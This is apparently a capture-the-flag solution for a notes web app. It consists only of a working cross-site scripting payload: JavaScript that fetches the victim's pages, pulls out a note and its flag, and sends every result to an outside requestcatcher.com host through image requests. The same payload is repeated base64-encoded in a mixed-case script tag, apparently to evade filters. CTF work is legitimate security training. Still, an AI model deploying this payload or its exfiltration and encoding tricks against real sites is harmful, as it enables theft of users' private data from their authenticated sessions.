# Solution

Payload:
```javascript
const extract = (content, key_start, key_end, include_keys) => {
    if(!content.includes(key_start) || !content.includes(key_end)){
        return undefined;
    }

    const value = content.split(key_start)[1].split(key_end)[0]
    return (include_keys !== false ? key_start + value + key_end : value)
}

const log = (msg) => { 
    const img = document.createElement('img');
    img.src = 'https://testasdasd.requestcatcher.com/test?c=' + encodeURIComponent(msg)
    document.body.appendChild(img)
}

(async () => {
    log("Loaded script")

    const res = await fetch("/");
    const page_index = await res.text();
    
    log(page_index) // Logs all the page contents
    const note_id = extract(page_index, "/view.php?note=", '"', false)
    log(`Target note: ${note_id}`)

    const page_flag = await (await fetch("/view.php?note=" + note_id)).text()
    const flag = extract(page_flag, "CTF{", "}", true)
    log(`Flag: ${flag}`)
})()
```

## Encoded payload

```html
<Script src="data:text/plain;charset=utf-8;base64,Y29uc3QgZXh0cmFjdCA9IChjb250ZW50LCBrZXlfc3RhcnQsIGtleV9lbmQsIGluY2x1ZGVfa2V5cykgPT4gew0KICAgIGlmKCFjb250ZW50LmluY2x1ZGVzKGtleV9zdGFydCkgfHwgIWNvbnRlbnQuaW5jbHVkZXMoa2V5X2VuZCkpew0KICAgICAgICByZXR1cm4gdW5kZWZpbmVkOw0KICAgIH0NCg0KICAgIGNvbnN0IHZhbHVlID0gY29udGVudC5zcGxpdChrZXlfc3RhcnQpWzFdLnNwbGl0KGtleV9lbmQpWzBdDQogICAgcmV0dXJuIChpbmNsdWRlX2tleXMgIT09IGZhbHNlID8ga2V5X3N0YXJ0ICsgdmFsdWUgKyBrZXlfZW5kIDogdmFsdWUpDQp9DQoNCmNvbnN0IGxvZyA9IChtc2cpID0+IHsgDQogICAgY29uc3QgaW1nID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaW1nJyk7DQogICAgaW1nLnNyYyA9ICdodHRwczovL3Rlc3Rhc2Rhc2QucmVxdWVzdGNhdGNoZXIuY29tL3Rlc3Q/Yz0nICsgZW5jb2RlVVJJQ29tcG9uZW50KG1zZykNCiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGltZykNCn0NCg0KKGFzeW5jICgpID0+IHsNCiAgICBsb2coIkxvYWRlZCBzY3JpcHQiKQ0KDQogICAgY29uc3QgcmVzID0gYXdhaXQgZmV0Y2goIi8iKTsNCiAgICBjb25zdCBwYWdlX2luZGV4ID0gYXdhaXQgcmVzLnRleHQoKTsNCiAgICANCiAgICBsb2cocGFnZV9pbmRleCkgLy8gTG9ncyBhbGwgdGhlIHBhZ2UgY29udGVudHMNCiAgICBjb25zdCBub3RlX2lkID0gZXh0cmFjdChwYWdlX2luZGV4LCAiL3ZpZXcucGhwP25vdGU9IiwgJyInLCBmYWxzZSkNCiAgICBsb2coYFRhcmdldCBub3RlOiAke25vdGVfaWR9YCkNCg0KICAgIGNvbnN0IHBhZ2VfZmxhZyA9IGF3YWl0IChhd2FpdCBmZXRjaCgiL3ZpZXcucGhwP25vdGU9IiArIG5vdGVfaWQpKS50ZXh0KCkNCiAgICBjb25zdCBmbGFnID0gZXh0cmFjdChwYWdlX2ZsYWcsICJDVEZ7IiwgIn0iLCB0cnVlKQ0KICAgIGxvZyhgRmxhZzogJHtmbGFnfWApDQp9KSgp"></script>
```